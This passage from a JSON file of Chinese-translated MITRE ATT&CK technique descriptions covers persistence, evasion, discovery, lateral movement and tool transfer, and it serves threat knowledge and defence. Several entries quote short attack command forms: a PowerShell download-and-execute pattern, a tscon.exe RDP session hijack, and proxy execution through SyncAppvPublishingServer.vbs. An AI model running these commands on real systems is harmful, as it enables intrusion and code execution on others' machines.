        "translated_description": "对手可能会扫描受害者的IP块以收集可用于目标的信息。公共IP地址可能按块或一系列连续地址分配给组织。\n\n对手可能会扫描IP块以[收集受害者网络信息](https://attack.mitre.org/techniques/T1590)，例如哪些IP地址正在使用以及有关分配这些地址的主机的更详细信息。扫描可能从简单的ping（ICMP请求和响应）到更复杂的扫描，可能通过服务器横幅或其他网络工件揭示主机软件/版本。(引用: Botnet Scan) 来自这些扫描的信息可能揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Template Injection": {
        "translated_name": "模板注入",
        "translated_description": "对手可能会创建或修改用户文档模板中的引用以隐藏恶意代码或强制身份验证尝试。例如，Microsoft的Office Open XML (OOXML)规范定义了一种基于XML的Office文档格式（.docx、.xlsx、.pptx）以取代旧的二进制格式（.doc、.xls、.ppt）。OOXML文件是由各种XML文件组成的ZIP归档文件，称为部分，包含定义文档如何呈现的属性。(引用: Microsoft Open XML July 2017)\n\n部分中的属性可能引用通过在线URL访问的共享公共资源。例如，模板属性可能引用一个文件，作为预格式化的文档蓝图，在加载文档时获取。\n\n对手可能会滥用这些模板来最初隐藏通过用户文档执行的恶意代码。注入文档的模板引用可能允许在加载文档时获取和执行恶意负载。(引用: SANS Brian Wiltse Template Injection) 这些文档可以通过其他技术如[网络钓鱼](https://attack.mitre.org/techniques/T1566)和/或[污染共享内容](https://attack.mitre.org/techniques/T1080)传递，并且可能会逃避静态检测，因为在获取恶意负载之前没有典型的指示器（VBA宏、脚本等）存在。(引用: Redxorblue Remote Template Injection) 在野外已经看到的示例中，模板注入被用来加载包含漏洞利用的恶意代码。(引用: MalwareBytes Template Injection OCT 2017)\n\n对手还可能修改<code>*\\template</code>控制字在.rtf文件中类似地隐藏然后下载恶意代码。这个合法的控制字值旨在成为模板文件资源的文件目标，在打开.rtf文件时检索和加载。然而，对手可能会更改现有.rtf文件的字节以插入模板控制字字段，包括恶意负载的URL资源。(引用: Proofpoint RTF Injection)(引用: Ciberseguridad Decoding malicious RTF files)\n\n此技术还可能通过注入SMB/HTTPS（或其他凭证提示）URL并触发身份验证尝试来启用[强制身份验证](https://attack.mitre.org/techniques/T1187)。(引用: Anomali Template Injection MAR 2018)(引用: Talos Template Injection July 2017)(引用: ryhanson phishery SEPT 2016)"
    },
    "RC Scripts": {
        "translated_name": "RC脚本",
        "translated_description": "对手可能通过修改在类Unix系统启动期间执行的RC脚本来建立持久性。这些文件允许系统管理员在不同运行级别启动自定义服务。修改RC脚本需要root权限。\n\n对手可以通过将恶意二进制路径或shell命令添加到<code>rc.local</code>、<code>rc.common</code>和其他特定于类Unix发行版的RC脚本来建立持久性。(引用: IranThreats Kittens Dec 2017)(引用: Intezer HiddenWasp Map 2019) 重启后，系统以root身份执行脚本的内容，从而实现持久性。\n\n对手滥用RC脚本在默认使用root用户的轻量级类Unix发行版（如IoT或嵌入式系统）中特别有效。(引用: intezer-kaiji-malware)\n\n一些类Unix系统已经迁移到Systemd并弃用了RC脚本。在macOS中，这是一种弃用的机制，取而代之的是[Launchd](https://attack.mitre.org/techniques/T1053/004)。(引用: Apple Developer Doco Archive Launchd)(引用: Startup Items) 此技术可用于Mac OS X Panther v10.3及更早版本，这些版本仍然执行RC脚本。(引用: Methods of Mac Malware Persistence) 为了保持向后兼容性，一些系统（如Ubuntu）将在存在正确文件权限的情况下执行RC脚本。(引用: Ubuntu Manpage systemd rc)"
    },
    "Access Token Manipulation": {
        "translated_name": "访问令牌操纵",
        "translated_description": "对手可能会修改访问令牌以在不同用户或系统安全上下文下操作以执行操作并绕过访问控制。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌，使正在运行的进程看起来像是属于不同进程的子进程或属于启动进程的用户以外的其他人。当发生这种情况时，进程还会采用与新令牌关联的安全上下文。\n\n对手可以使用内置的Windows API函数从现有进程中复制访问令牌；这称为令牌窃取。这些令牌可以应用于现有进程（即[令牌冒充/窃取](https://attack.mitre.org/techniques/T1134/001)）或用于生成新进程（即[使用令牌创建进程](https://attack.mitre.org/techniques/T1134/002)）。对手必须已经处于特权用户上下文（即管理员）才能窃取令牌。然而，对手通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果账户在远程系统上具有适当权限，对手可以使用令牌作为该账户进行身份验证。(引用: Pentestlab Token Manipulation)\n\n任何标准用户都可以使用<code>runas</code>命令和Windows API函数创建冒充令牌；这不需要访问管理员账户。还有其他机制，如Active Directory字段，可以用来修改访问令牌。"
    },
    "Multi-Factor Authentication Interception": {
        "translated_name": "多因素认证拦截",
        "translated_description": "对手可能会针对多因素认证（MFA）机制（即智能卡、令牌生成器等）以获取可用于访问系统、服务和网络资源的凭据。使用MFA是推荐的，并提供比仅用户名和密码更高的安全级别，但组织应意识到可能用于拦截和绕过这些安全机制的技术。\n\n如果智能卡用于多因素认证，则需要使用键盘记录器获取与智能卡关联的密码。在正常使用期间，插入卡并访问智能卡密码的对手可以使用受感染的系统代理插入的硬件令牌进行身份验证。(引用: Mandiant M Trends 2011)\n\n对手还可能使用键盘记录器类似地针对其他硬件令牌，如RSA SecurID。捕获令牌输入（包括用户的个人识别码）可能提供临时访问（即重放一次性密码，直到下一个值翻转）以及可能使对手能够可靠地预测未来的认证值（假设访问生成附加临时代码的算法和任何种子值）。(引用: GCN RSA June 2011)\n\n其他MFA方法可能被对手拦截并用于身份验证。一次性代码通过带外通信（电子邮件、SMS）发送是常见的。如果设备和/或服务未加密，则可能容易被拦截。服务提供商也可能成为目标：例如，对手可能会妥协SMS消息服务以窃取发送到用户手机的MFA代码。(引用: Okta Scatter Swine 2022)"
    },
    "Software Packing": {
        "translated_name": "软件打包",
        "translated_description": "对手可能会执行软件打包或虚拟机软件保护来隐藏他们的代码。软件打包是一种压缩或加密可执行文件的方法。打包可执行文件会更改文件签名，以尝试避免基于签名的检测。大多数解压技术会在内存中解压可执行代码。虚拟机软件保护将可执行文件的原始代码转换为只有特殊虚拟机才能运行的特殊格式。然后调用虚拟机来运行此代码。(引用: ESET FinFisher Jan 2018)\n\n用于执行软件打包的工具称为打包器。示例打包器有MPRESS和UPX。已知打包器的更全面列表可用，但对手可能会创建自己的打包技术，这些技术不会留下与已知打包器相同的工件，以规避防御。(引用: Awesome Executable Packing)"
    },
    "Web Protocols": {
        "translated_name": "Web协议",
        "translated_description": "对手可能会使用与Web流量相关的应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。对远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\nHTTP/S(引用: CrowdStrike Putter Panda)和WebSocket(引用: Brazking-Websockets)等协议可能在环境中非常常见。HTTP/S数据包有许多字段和头部可以隐藏数据。对手可能会滥用这些协议与他们控制的系统在受害者网络中进行通信，同时模仿正常的预期流量。"
    },
    "Visual Basic": {
        "translated_name": "Visual Basic",
        "translated_description": "对手可能会滥用Visual Basic (VB)进行执行。VB是由Microsoft创建的编程语言，与许多Windows技术（如[组件对象模型](https://attack.mitre.org/techniques/T1559/001)和[本机API](https://attack.mitre.org/techniques/T1106)）通过Windows API互操作。尽管被标记为遗留，没有计划的未来演变，VB集成并支持.NET Framework和跨平台.NET Core。(引用: VB .NET Mar 2020)(引用: VB Microsoft)\n\n基于VB的衍生语言也已创建，例如Visual Basic for Applications (VBA)和VBScript。VBA是一种事件驱动的编程语言，内置于Microsoft Office以及几个第三方应用程序中。(引用: Microsoft VBA)(引用: Wikipedia VBA) VBA使文档能够包含用于自动执行任务和主机上其他功能的宏。VBScript是Windows主机上的默认脚本语言，也可以在HTML应用程序(HTA)网页上代替[JavaScript](https://attack.mitre.org/techniques/T1059/007)使用，尽管大多数现代浏览器不支持VBScript。(引用: Microsoft VBScript)\n\n对手可能会使用VB有效载荷执行恶意命令。常见的恶意使用包括使用VBScript自动执行行为或将VBA内容嵌入[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)有效载荷中（这也可能涉及[Web标记绕过](https://attack.mitre.org/techniques/T1553/005)以启用执行）。(引用: Default VBS macros Blocking)"
    },
    "Hidden File System": {
        "translated_name": "隐藏文件系统",
        "translated_description": "对手可能会使用隐藏文件系统来隐藏用户和安全工具的恶意活动。文件系统提供了一个结构，用于从物理存储中存储和访问数据。通常，用户通过允许他们访问文件和目录的应用程序与文件系统交互，这些文件和目录是其物理位置（例如：磁盘扇区）的抽象。标准文件系统包括FAT、NTFS、ext4和APFS。文件系统还可以包含其他结构，例如NTFS中的卷引导记录(VBR)和主文件表(MFT)。(引用: MalwareTech VFS Nov 2014)\n\n对手可能会使用他们自己的抽象文件系统，与受感染系统上存在的标准文件系统分开。这样，对手可以隐藏恶意组件和文件输入/输出的存在，避免安全工具的检测。隐藏文件系统，有时称为虚拟文件系统，可以通过多种方式实现。一种实现方式是将文件系统存储在磁盘结构或标准文件系统分区未使用的保留磁盘空间中。(引用: MalwareTech VFS Nov 2014)(引用: FireEye Bootkits) 另一种实现方式是对手将自己的便携式分区映像作为文件放在标准文件系统之上。(引用: ESET ComRAT May 2020) 对手还可能以非标准方式在现有文件系统结构中分散文件。(引用: Kaspersky Equation QA)"
    },
    "Systemd Service": {
        "translated_name": "Systemd服务",
        "translated_description": "对手可能会创建或修改systemd服务，以作为持久性的一部分反复执行恶意负载。Systemd是一个系统和服务管理器，通常用于管理后台守护进程（也称为服务）和其他系统资源。(引用: Linux man-pages: systemd January 2014) Systemd是许多Linux发行版上的默认初始化(init)系统，取代了遗留的init系统，包括SysVinit和Upstart，同时保持向后兼容。\n\nSystemd使用扩展名为.service的单元配置文件来编码有关服务进程的信息。默认情况下，系统级单元文件存储在根拥有的目录(/)的/systemd/system目录中。用户级单元文件存储在用户拥有的目录($HOME)的/systemd/user目录中。(引用: lambert systemd 2022)\n\n在.service单元文件中，以下指令用于执行命令：(引用: freedesktop systemd.service)\n\n* ExecStart、ExecStartPre和ExecStartPost指令在服务由systemctl手动启动或在系统启动时执行，如果服务设置为自动启动。\n* ExecReload指令在服务重新启动时执行。\n* ExecStop、ExecStopPre和ExecStopPost指令在服务停止时执行。\n\n对手已经创建了新的服务文件，更改了.service文件指令执行的命令，并修改了.service文件执行的用户指令，这可能导致权限提升。对手还可能在这些目录中放置符号链接，使systemd能够找到这些负载，无论它们在文件系统中的位置。(引用: Anomali Rocke March 2019)(引用: airwalk backdoor unix systems)(引用: Rapid7 Service Persistence 22JUNE2016)\n\n.service文件的User指令可用于以特定用户身份运行服务，这可能会根据特定用户/组权限导致权限提升。"
    },
    "RDP Hijacking": {
        "translated_name": "RDP劫持",
        "translated_description": "对手可能会劫持合法用户的远程桌面会话，在环境中横向移动。远程桌面是操作系统中的常见功能。它允许用户登录到远程系统上的交互式会话，具有系统桌面图形用户界面。Microsoft将其远程桌面协议(RDP)的实现称为远程桌面服务(RDS)。(引用: TechNet Remote Desktop Services)\n\n对手可能会执行RDP会话劫持，涉及窃取合法用户的远程会话。通常，当其他人试图窃取他们的会话时，用户会收到通知。使用系统权限和终端服务控制台，c:\\windows\\system32\\tscon.exe [要被窃取的会话号]，对手可以在不需要凭据或提示用户的情况下劫持会话。(引用: RDP Hijacking Korznikov) 这可以远程或本地完成，并且适用于活动或断开的会话。(引用: RDP Hijacking Medium) 它还可以通过窃取域管理员或更高权限账户会话导致[远程系统发现](https://attack.mitre.org/techniques/T1018)和权限提升。所有这些都可以使用本机Windows命令完成，但它也已作为红队工具中的功能。(引用: Kali Redsnarf)"
    },
    "Create Account": {
        "translated_name": "创建账户",
        "translated_description": "对手可能会创建账户以保持对受害者系统的访问。(引用: Symantec WastedLocker June 2020) 具有足够访问权限的情况下，创建此类账户可用于建立不需要在系统上部署持久远程访问工具的次要凭证访问。\n\n账户可以在本地系统或域或云租户中创建。在云环境中，对手可能会创建仅有权访问特定服务的账户，这可以减少被检测的机会。"
    },
    "XDG Autostart Entries": {
        "translated_name": "XDG自动启动条目",
        "translated_description": "对手可能会添加或修改XDG自动启动条目，以在用户桌面环境加载时执行恶意程序或命令。XDG自动启动条目适用于任何符合XDG的Linux系统。XDG自动启动条目使用桌面条目文件(.desktop)配置用户的桌面环境在用户登录时加载。这些配置文件确定用户登录时启动的应用程序，定义打开特定文件类型的关联应用程序，并定义用于打开可移动媒体的应用程序。(引用: Free Desktop Application Autostart Feb 2006)(引用: Free Desktop Entry Keys)\n\n对手可能会滥用此功能，通过将恶意二进制文件或命令的路径添加到.desktop配置文件中的Exec指令来建立持久性。当用户桌面环境在用户登录时加载时，位于XDG自动启动目录中的.desktop文件会自动执行。系统范围的自动启动条目位于/etc/xdg/autostart目录中，而用户条目位于~/.config/autostart目录中。\n\n对手可能会将此技术与[伪装](https://attack.mitre.org/techniques/T1036)结合使用，以将恶意自动启动条目与合法程序混合。(引用: Red Canary Netwire Linux 2022)"
    },
    "Cloud Service Discovery": {
        "translated_name": "云服务发现",
        "translated_description": "攻击者在获得访问权限后，可能会尝试枚举系统上运行的云服务。这些方法可能因平台即服务（PaaS）、基础设施即服务（IaaS）或软件即服务（SaaS）而有所不同。各种云提供商中存在许多服务，包括持续集成和持续交付（CI/CD）、Lambda函数、Entra ID等。还可能包括安全服务，如AWS GuardDuty和Microsoft Defender for Cloud，以及日志服务，如AWS CloudTrail和Google Cloud Audit Logs。\n\n攻击者可能会尝试发现环境中启用的服务信息。Azure工具和API，如Microsoft Graph API和Azure Resource Manager API，可以枚举资源和服务，包括应用程序、管理组、资源和策略定义，以及身份可访问的关系。(引用: Azure - Resource Manager API)(引用: Azure AD Graph API)\n\n例如，Stormspotter是一个用于枚举和构建Azure资源和服务图的开源工具，Pacu是一个支持多种云服务发现方法的开源AWS利用框架。(引用: Azure - Stormspotter)(引用: GitHub Pacu)\n\n攻击者可能会利用获得的信息来塑造后续行为，例如从枚举的服务中获取数据或凭据，或通过[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)或[禁用或修改云日志](https://attack.mitre.org/techniques/T1562/008)来规避已识别的防御。"
    },
    "Remote System Discovery": {
        "translated_name": "远程系统发现",
        "translated_description": "攻击者可能会尝试通过IP地址、主机名或其他逻辑标识符获取网络上其他系统的列表，以便从当前系统进行横向移动。远程访问工具可能具备此功能，但操作系统上的实用程序（如[Ping](https://attack.mitre.org/software/S0097)或使用[Net](https://attack.mitre.org/software/S0039)的<code>net view</code>）也可用于此目的。\n\n攻击者还可能分析本地主机文件（如<code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>或<code>/etc/hosts</code>）或其他被动手段（如本地[Arp](https://attack.mitre.org/software/S0099)缓存条目）以发现环境中远程系统的存在。\n\n攻击者还可能针对网络基础设施的发现，并利用网络设备上的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令来收集网络中系统的详细信息（如<code>show cdp neighbors</code>、<code>show arp</code>）。(引用: US-CERT-TA18-106A)(引用: CISA AR21-126A FIVEHANDS 2021年5月)"
    },
    "Network Service Discovery": {
        "translated_name": "网络服务发现",
        "translated_description": "攻击者可能会尝试获取远程主机和本地网络基础设施设备上运行的服务的列表，包括可能易受远程软件利用的服务。获取此信息的常见方法包括使用工具进行端口和/或漏洞扫描。(引用: CISA AR21-126A FIVEHANDS 2021年5月)\n\n在云环境中，攻击者可能会尝试发现其他云主机上运行的服务。此外，如果云环境连接到本地环境，攻击者还可能识别非云系统上运行的服务。\n\n在macOS环境中，攻击者可能使用本地的Bonjour应用程序来发现网络中其他macOS主机上运行的服务。Bonjour的mDNSResponder守护进程会自动注册并广播主机在网络上注册的服务。例如，攻击者可以使用mDNS查询（如<code>dns-sd -B _ssh._tcp .</code>）来查找广播ssh服务的其他系统。(引用: Apple文档Bonjour描述)(引用: macOS APT活动Bradley)"
    },
    "Domain Properties": {
        "translated_name": "域属性",
        "translated_description": "攻击者可能会收集受害者网络域的信息，以便在目标定位中使用。关于域及其属性的信息可能包括各种细节，例如受害者拥有的域以及管理数据（如名称、注册商等），以及更直接可操作的信息，如联系人（电子邮件地址和电话号码）、商业地址和名称服务器。\n\n攻击者可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)直接收集。受害者域及其属性的信息也可能通过在线或其他可访问的数据集（如[WHOIS](https://attack.mitre.org/techniques/T1596/002)）暴露给攻击者。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) 在使用第三方云提供商的情况下，这些信息也可能通过公开的API端点（如Office 365环境中的GetUserRealm和autodiscover）暴露。(引用: Azure Active Directory侦察)(引用: Office 365 Azure域可用性) 收集这些信息可能揭示其他侦察形式的机会（如[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)、[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（如[获取基础设施](https://attack.mitre.org/techniques/T1583)或[破坏基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（如[钓鱼](https://attack.mitre.org/techniques/T1566)）。"
    },
    "Software Discovery": {
        "translated_name": "软件发现",
        "translated_description": "攻击者可能会尝试获取系统或云环境中安装的软件及其版本的列表。攻击者可能在自动发现过程中使用[软件发现](https://attack.mitre.org/techniques/T1518)的信息来塑造后续行为，包括是否完全感染目标或尝试特定操作。\n\n此类软件可能广泛部署于环境中用于配置管理或安全原因，如[软件部署工具](https://attack.mitre.org/techniques/T1072)，并可能允许攻击者广泛访问以感染设备或横向移动。\n\n攻击者可能尝试枚举软件以获取各种信息，例如确定存在哪些安全措施，或受感染系统是否具有易受[特权提升利用](https://attack.mitre.org/techniques/T1068)的软件版本。"
    },
    "Cloud Service Dashboard": {
        "translated_name": "云服务仪表板",
        "translated_description": "攻击者可能使用被盗凭证通过云服务仪表板GUI从操作云环境中获取有用信息，例如特定服务、资源和功能。例如，GCP Command Center可用于查看所有资产、潜在安全风险的发现，并运行其他查询，如查找公共IP地址和开放端口。(引用: Google Command Center仪表板)\n\n根据环境的配置，攻击者可能通过图形仪表板枚举比API更多的信息。这使得攻击者无需发出任何API请求即可获取信息。"
    },
    "Thread Local Storage": {
        "translated_name": "线程本地存储",
        "translated_description": "攻击者可能通过线程本地存储（TLS）回调将恶意代码注入进程中，以规避基于进程的防御并可能提升权限。TLS回调注入是一种在独立活动进程的地址空间中执行任意代码的方法。\n\nTLS回调注入涉及操纵可移植可执行文件（PE）内的指针，以在到达代码的合法入口点之前将进程重定向到恶意代码。TLS回调通常由操作系统用于设置和/或清理线程使用的数据。操纵TLS回调可能通过使用其他[进程注入](https://attack.mitre.org/techniques/T1055)技术（如[进程挖空](https://attack.mitre.org/techniques/T1055/012)）分配和写入进程内存空间中的特定偏移量来执行。(引用: FireEye TLS 2017年11月)\n\n在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过TLS回调注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Debugger Evasion": {
        "translated_name": "调试器规避",
        "translated_description": "攻击者可能采用各种手段检测和规避调试器。调试器通常被防御者用于跟踪和/或分析潜在恶意软件负载的执行。(引用: ProcessHacker GitHub)\n\n调试器规避可能包括根据检查调试环境存在的工件结果改变行为。类似于[虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497)，如果攻击者检测到调试器，他们可能会改变其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放次要或附加负载之前搜索调试器工件。\n\n具体检查将根据目标和/或攻击者而有所不同，但可能涉及[Native API](https://attack.mitre.org/techniques/T1106)函数调用，如<code>IsDebuggerPresent()</code>和<code>NtQueryInformationProcess()</code>，或手动检查进程环境块（PEB）的<code>BeingDebugged</code>标志。其他调试工件的检查还可能尝试枚举硬件断点、中断汇编操作码、时间检查，或测量当前进程中是否引发异常（假设存在的调试器会“吞下”或处理潜在错误）。(引用: hasherezade调试)(引用: AlKhaser调试)(引用: vxunderground调试)\n\n攻击者可能在自动发现过程中使用从这些调试器检查中学到的信息来塑造后续行为。调试器还可以通过分离进程或通过循环[Native API](https://attack.mitre.org/techniques/T1106)函数调用（如<code>OutputDebugStringW()</code>）产生的消息用无意义的数据淹没调试日志来规避。(引用: wardle evilquest partii)(引用: Checkpoint Dridex 2021年1月)"
    },
    "Space after Filename": {
        "translated_name": "文件名后的空格",
        "translated_description": "攻击者可以通过更改文件的扩展名来隐藏程序的真实文件类型。对于某些文件类型（特别是这不适用于.app扩展名），在文件名末尾附加空格将改变操作系统处理文件的方式。\n\n例如，如果有一个名为<code>evil.bin</code>的Mach-O可执行文件，当用户双击它时，它将启动Terminal.app并执行。如果将此文件重命名为<code>evil.txt</code>，则当用户双击它时，它将使用默认的文本编辑应用程序启动（不执行二进制文件）。但是，如果文件重命名为<code>evil.txt </code>（注意末尾的空格），则当用户双击它时，操作系统将确定真实文件类型并适当处理，二进制文件将被执行。(引用: Mac后门回归)\n\n攻击者可以利用此功能诱使用户双击任何格式的看似无害的文件，最终执行恶意内容。"
    },
    "Re-opened Applications": {
        "translated_name": "重新打开的应用程序",
        "translated_description": "攻击者可能会修改plist文件以在用户登录时自动运行应用程序。当用户通过macOS图形用户界面（GUI）注销或重启时，系统会向用户提供一个提示，其中包含一个复选框“在重新登录时重新打开窗口”。(引用: Mac重新打开窗口) 当选中时，所有当前打开的应用程序都会添加到<code>~/Library/Preferences/ByHost</code>目录中名为<code>com.apple.loginwindow.[UUID].plist</code>的属性列表文件中。(引用: Mac恶意软件持久性方法)(引用: Wardle持久性章节) 列在此文件中的应用程序将在用户下次登录时自动重新打开。\n\n攻击者可以通过将恶意应用程序路径添加到<code>com.apple.loginwindow.[UUID].plist</code>文件中来建立[持久性](https://attack.mitre.org/tactics/TA0003)，以便在用户登录时执行负载。"
    },
    "SEO Poisoning": {
        "translated_name": "SEO投毒",
        "translated_description": "攻击者可能会毒化影响搜索引擎优化（SEO）的机制，以进一步诱使潜在受害者访问其分阶段的能力。搜索引擎通常根据购买的广告以及其网络爬虫和算法计算的网站排名/分数/声誉向用户显示结果。(引用: Atlas SEO)(引用: MalwareBytes SEO)\n\n为了帮助促进[路过式攻击](https://attack.mitre.org/techniques/T1189)，攻击者可能会分阶段内容，明确操纵SEO排名，以推广托管其恶意负载的网站（如[路过式目标](https://attack.mitre.org/techniques/T1608/004)）在搜索引擎中。SEO排名投毒可能涉及各种技巧，例如将关键词（包括隐藏文本形式）填充到受感染的网站中。这些关键词可能与目标受害者的兴趣/浏览习惯相关，也可能是更广泛的季节性热门话题（如选举、趋势新闻）。(引用: ZScaler SEO)(引用: Atlas SEO)\n\n除了互联网搜索引擎（如Google），攻击者还可能旨在操纵特定站点内搜索（如GitHub）以欺骗用户访问[供应链攻击](https://attack.mitre.org/techniques/T1195)诱饵。站点内搜索将根据其自己的算法和指标（如流行度）对搜索结果进行排名，这些指标可能被恶意行为者针对和操纵。(引用: Chexmarx-seo)(引用: Checkmarx-oss-seo)\n\n攻击者还可能购买或植入指向分阶段能力的传入链接，以提高网站的计算相关性和声誉。(引用: MalwareBytes SEO)(引用: DFIR Report Gootloader)\n\nSEO投毒还可能结合规避重定向和其他伪装机制（如测量鼠标移动或基于浏览器用户代理、用户语言/本地化设置或HTTP标头提供内容），以便在避免防御者审查的同时提供SEO输入。(引用: ZScaler SEO)(引用: Sophos Gootloader)"
    },
    "Pass the Hash": {
        "translated_name": "哈希传递",
        "translated_description": "攻击者可能会使用被盗的密码哈希在环境中横向移动，绕过正常的系统访问控制。哈希传递（PtH）是一种无需访问用户明文密码即可验证用户身份的方法。此方法绕过需要明文密码的标准验证步骤，直接进入使用密码哈希的验证部分。\n\n在执行PtH时，使用[凭据访问](https://attack.mitre.org/tactics/TA0006)技术捕获用于该帐户的有效密码哈希。捕获的哈希与PtH一起用于验证该用户身份。一旦验证通过，PtH可用于在本地或远程系统上执行操作。\n\n攻击者还可能使用被盗的密码哈希进行“超哈希传递”。类似于PtH，这涉及使用密码哈希验证用户身份，但还使用密码哈希创建有效的Kerberos票证。然后，此票证可用于执行[票证传递](https://attack.mitre.org/techniques/T1550/003)攻击。(引用: Stealthbits超哈希传递)"
    },
    "Exfiltration Over Physical Medium": {
        "translated_name": "通过物理介质外泄",
        "translated_description": "攻击者可能会尝试通过物理介质（如可移动驱动器）外泄数据。在某些情况下，例如隔离网络被攻破，外泄可能通过用户引入的物理介质或设备发生。此类介质可能是外部硬盘、USB驱动器、手机、MP3播放器或其他可移动存储和处理设备。物理介质或设备可用作最终外泄点或在其他断开的系统之间跳跃。"
    },
    "DLL Side-Loading": {
        "translated_name": "DLL侧加载",
        "translated_description": "攻击者可能通过侧加载DLL执行其恶意负载。类似于[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)，侧加载涉及劫持程序加载的DLL。但不仅仅是将DLL放置在程序的搜索顺序中然后等待受害者应用程序被调用，攻击者可能通过放置并调用执行其负载的合法应用程序直接侧加载其负载。\n\n侧加载利用加载器使用的DLL搜索顺序，将受害者应用程序和恶意负载并排放置。攻击者可能使用侧加载作为在合法、受信任且可能提升权限的系统或软件进程下掩盖其操作的手段。用于侧加载负载的良性可执行文件在交付和/或执行期间可能不会被标记。攻击者负载在被加载到受信任进程的内存之前也可能被加密/打包或以其他方式混淆。(引用: FireEye DLL侧加载)"
    },
    "Ingress Tool Transfer": {
        "translated_name": "入口工具传输",
        "translated_description": "攻击者可能会将工具或其他文件从外部系统传输到受感染的环境中。工具或文件可以通过命令和控制通道或通过替代协议（如[ftp](https://attack.mitre.org/software/S0095)）从外部攻击者控制的系统复制到受害者网络。一旦存在，攻击者还可能在受感染环境内的受害者设备之间传输/传播工具（即[横向工具传输](https://attack.mitre.org/techniques/T1570)）。\n\n在Windows上，攻击者可能使用各种实用程序下载工具，例如`copy`、`finger`、[certutil](https://attack.mitre.org/software/S0160)和[PowerShell](https://attack.mitre.org/techniques/T1059/001)命令，如<code>IEX(New-Object Net.WebClient).downloadString()</code>和<code>Invoke-WebRequest</code>。在Linux和macOS系统上，也存在各种实用程序，如`curl`、`scp`、`sftp`、`tftp`、`rsync`、`finger`和`wget`。(引用: t1105_lolbas)\n\n攻击者还可能滥用安装程序和包管理器（如`yum`或`winget`）将工具下载到受害者主机。攻击者还滥用了文件应用程序功能，例如Windows的`search-ms`协议处理程序，通过[用户执行](https://attack.mitre.org/techniques/T1204)（通常在与[钓鱼](https://attack.mitre.org/techniques/T1566)诱饵交互后）触发的远程文件搜索将恶意文件传递给受害者。(引用: T1105: Trellix_search-ms)\n\n文件还可以使用各种[Web服务](https://attack.mitre.org/techniques/T1102)以及受害者系统上的本机或其他现有工具进行传输。(引用: PTSecurity Cobalt 2016年12月) 在某些情况下，攻击者可能能够利用在基于Web和本地客户端之间同步的服务（如Dropbox或OneDrive）将文件传输到受害者系统。例如，通过入侵云帐户并登录服务的Web门户，攻击者可能能够触发自动同步过程，将文件传输到受害者的机器上。(引用: Dropbox恶意软件同步)"
    },
    "SyncAppvPublishingServer": {
        "translated_name": "SyncAppvPublishingServer",
        "translated_description": "攻击者可能滥用SyncAppvPublishingServer.vbs来代理执行恶意的[PowerShell](https://attack.mitre.org/techniques/T1059/001)命令。SyncAppvPublishingServer.vbs是与Windows虚拟化应用程序（Microsoft Application Virtualization，或App-V）相关的Visual Basic脚本。(引用: 1 - appv) 例如，Windows可能将Win32应用程序呈现给用户作为虚拟应用程序，允许用户像本地安装一样启动和与它们交互。(引用: 2 - appv)(引用: 3 - appv)\n    \nSyncAppvPublishingServer.vbs脚本是合法的，可能由Microsoft签名，通常通过`wscript.exe`从`\\System32`通过命令行执行。(引用: 4 - appv)(引用: 5 - appv)\n\n攻击者可能滥用SyncAppvPublishingServer.vbs来绕过[PowerShell](https://attack.mitre.org/techniques/T1059/001)执行限制，并通过“利用现有资源”规避防御措施。(引用: 6 - appv)(引用: 4 - appv) 代理执行可能作为直接调用`powershell.exe`的受信任/签名的替代方案。(引用: 7 - appv)\n\n例如，可以使用以下方式调用[PowerShell](https://attack.mitre.org/techniques/T1059/001)命令：(引用: 5 - appv)\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`"
    },
    "Additional Email Delegate Permissions": {
        "translated_name": "额外的电子邮件委托权限",
        "translated_description": "攻击者可能会授予额外的权限级别，以保持对攻击者控制的电子邮件帐户的持久访问。\n\n例如，<code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet（在本地Exchange和基于云的服务Office 365中可用）向邮箱添加权限。(引用: Microsoft - Add-MailboxPermission)(引用: FireEye APT35 2018)(引用: Crowdstrike Hiding in Plain Sight 2018) 在Google Workspace中，可以通过Google Admin控制台启用委托，用户可以通过其Gmail设置委托帐户。(引用: Gmail委托)(引用: Google确保您的信息安全)\n\n攻击者还可以通过单独的文件夹权限或角色分配邮箱文件夹权限。在Office 365环境中，攻击者可能会为“信息存储顶部”（根目录）、收件箱或其他邮箱文件夹分配默认或匿名用户权限或角色。通过为一个文件夹分配一个或两个用户权限，攻击者可以利用租户中的任何其他帐户来保持对目标用户邮件文件夹的持久访问。(引用: Mandiant Defend 